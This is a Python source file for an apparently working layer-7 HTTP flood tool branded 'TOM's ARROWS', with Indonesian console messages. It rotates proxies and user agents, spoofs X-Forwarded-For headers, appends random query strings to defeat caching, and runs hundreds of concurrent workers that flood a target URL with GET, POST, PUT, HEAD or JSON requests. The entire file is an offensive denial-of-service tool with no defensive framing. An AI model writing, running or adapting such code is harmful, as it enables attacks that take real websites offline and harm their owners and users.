import asyncio
import aiohttp
import random
import sys
import string
import time
import argparse
from colorama import Fore, Style, init
import ssl
import os

init(autoreset=True)

# Logo
def show_logo():
    logo = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════╗
║ ████████╗ ██████╗ ███╗   ███╗███████╗                            ║
║ ╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝    ══> [ AUTHOR TOM26x ]   ║
║    ██║   ██║   ██║██╔████╔██║███████╗    ══> [ HTTP Flood    ]   ║
║    ██║   ██║   ██║██║╚██╔╝██║╚════██║    ══> [ LAYER 7       ]   ║
║    ██║   ╚██████╔╝██║ ╚═╝ ██║███████║    ══> [ VERSION 1     ]   ║
║    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝                            ║
║                ARROWS                                            ║
╚══════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}                TOM's ARROWS L7 Tool by TOMCAT26x
"""
    print(logo)

# Load file
def load_file(file):
    try:
        with open(file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] File '{file}' tidak ditemukan.")
        sys.exit(1)

# Generate random query string
def random_query(length=10):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choices(letters, k=length))

# Generate random JSON payload
def random_json():
    return {"data": random_query(20)}

# Proxy checker (basic)
async def validate_proxy(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5):
                return proxy
    except:
        return None

async def check_proxies(proxy_list):
    valid = []
    tasks = [validate_proxy(proxy) for proxy in proxy_list]
    for result in await asyncio.gather(*tasks):
        if result:
            valid.append(result)
    return valid

# Worker
async def flood_worker(session, method, url, proxies, user_agents, attack_type):
    while True:
        try:
            proxy = random.choice(proxies)
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }

            rand_query = f"?q={random_query(8)}"
            full_url = url + rand_query if attack_type == "RQUERY" else url
            kwargs = {"headers": headers, "proxy": proxy, "ssl": False}

            if method == "GET":
                async with session.get(full_url, **kwargs) as resp:
                    await resp.read()
            elif method == "HEAD":
                async with session.head(full_url, **kwargs) as resp:
                    await resp.read()
            elif method == "POST":
                async with session.post(full_url, data={"data": random_query(16)}, **kwargs) as resp:
                    await resp.read()
            elif method == "PUT":
                async with session.put(full_url, data={"data": random_query(16)}, **kwargs) as resp:
                    await resp.read()
            elif method == "JSON":
                async with session.post(full_url, json=random_json(), **kwargs) as resp:
                    await resp.read()
        except:
            pass

async def run_attack(url, method, threads, duration, proxies, user_agents, attack_type):
    connector = aiohttp.TCPConnector(ssl=False, limit=None)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asyncio.create_task(flood_worker(session, method, url, proxies, user_agents, attack_type)) for _ in range(threads)]
        await asyncio.sleep(duration)
        for task in tasks:
            task.cancel()

# CLI args
def parse_args():
    parser = argparse.ArgumentParser(description="THC Flood v2")
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--method", choices=["GET", "POST", "PUT", "JSON", "HEAD"], default="GET")
    parser.add_argument("--threads", type=int, default=300)
    parser.add_argument("--time", type=int, default=30)
    parser.add_argument("--proxy", default="proxy.txt")
    parser.add_argument("--ua", default="UA.txt")
    parser.add_argument("--attack", choices=["NORMAL", "RQUERY"], default="RQUERY")
    parser.add_argument("--check", action="store_true", help="Aktifkan proxy checker")
    parser.add_argument("--no-logo", action="store_true")
    return parser.parse_args()

# Main entry
def main():
    args = parse_args()
    if not args.no_logo:
        show_logo()

    print(f"{Fore.GREEN}[INFO] Target: {args.url} | Method: {args.method} | Threads: {args.threads} | Durasi: {args.time}s")

    proxies = load_file(args.proxy)
    user_agents = load_file(args.ua)

    if args.check:
        print(f"{Fore.YELLOW}[...] Mengecek proxy...")
        proxies_ok = asyncio.run(check_proxies(proxies))
        print(f"{Fore.CYAN}[OK] {len(proxies_ok)} proxy valid ditemukan.")
        if not proxies_ok:
            print(f"{Fore.RED}[X] Tidak ada proxy valid.")
            sys.exit(1)
        proxies = proxies_ok

    asyncio.run(run_attack(
        url=args.url,
        method=args.method,
        threads=args.threads,
        duration=args.time,
        proxies=proxies,
        user_agents=user_agents,
        attack_type=args.attack
    ))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Serangan dihentikan oleh user.")
